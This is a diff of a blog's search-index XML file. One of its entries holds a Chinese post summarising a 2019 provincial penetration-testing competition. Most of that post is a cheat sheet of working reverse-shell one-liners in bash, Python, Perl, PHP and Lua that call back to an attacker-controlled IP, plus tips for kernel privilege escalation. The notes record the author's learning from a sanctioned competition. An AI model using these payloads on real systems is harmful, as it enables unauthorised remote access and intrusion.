@@ -1,6 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[archives]]></title>
+    <url>%2F2019%2F10%2F09%2Farchives%2F</url>
+    <content type="text"></content>
+  </entry>
+  <entry>
     <title><![CDATA[比赛]]></title>
     <url>%2F2019%2F10%2F09%2F%E6%AF%94%E8%B5%9B-1%2F</url>
     <content type="text"><![CDATA[2019第二届江苏省网络空间安全（保密）知识技能大赛总结前言：这次的省赛虽然经历了一些波折，虽然自己仍然很菜，但是在队友的加持下拿到了一等奖。先吐槽一下初赛，是迄今为止打过最烂的ctf，差点没进得了决赛，还好老师找人沟通了一下。决赛有点像护网，都是真实的网站进行真实的渗透测试，测试的网站是由抽签决定的，其实有很大的运气成分，但是实力很重要，这次比赛学到了很多实战方面的东西，暑假到现在的安服工作也对我有很大的帮助。 由于漏洞是网站真实存在的，不能记录太多细节，所以这里只记录一些思路和总结 反弹shell常用方法：在拿到RCE后可以反弹shell，需要一台公网ip机器 通过nc反弹shell利用RCE执行：bash -i-&gt;&amp;/dev/tcp/ip/port 0-&gt;&amp;1 ip和port为自己公网主机的 公网ip主机执行：nc -lvp 通过python反弹shell利用RCE执行： 1python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);" ip和port为自己公网主机的 公网ip主机执行：nc -lvp perl反弹shell利用RCE执行 1perl -e 'use Socket;$i="10.1.1.19";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;' 公网ip主机执行：nc -lvp php反弹shell（php是世界上最好的语言）利用RCE执行 1php -r '$sock=fsockopen("10.1.1.19",8080);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' 公网ip主机执行：nc -lvp lua反弹shell利用RCCE执行 1lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.1.1.19','8080');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');" 公网ip主机执行：nc -lvp 提权常用方法反弹shell后权限一般较低，提权的方法挺多 提权方式： SUID提权，大师傅说这个方法实战很少，暂不深入，可参考网站 https://www.freebuf.com/articles/system/149118.html 内核提权 内核提权查看发行版 12cat /etc/issuecat cat /etc/*-release 查看内核版本 1uname -a 大多内核漏洞通过内核版本就可搜到 用kali自带的searchsploit来搜索exploitdb中的漏洞利用代码 1searchspoit linux 2.6 ubuntu priv esc 一般www权限可以在/tmp/目录（linux）或者c:\windows\system32\temp目录（windows）下有写的权限]]></content>
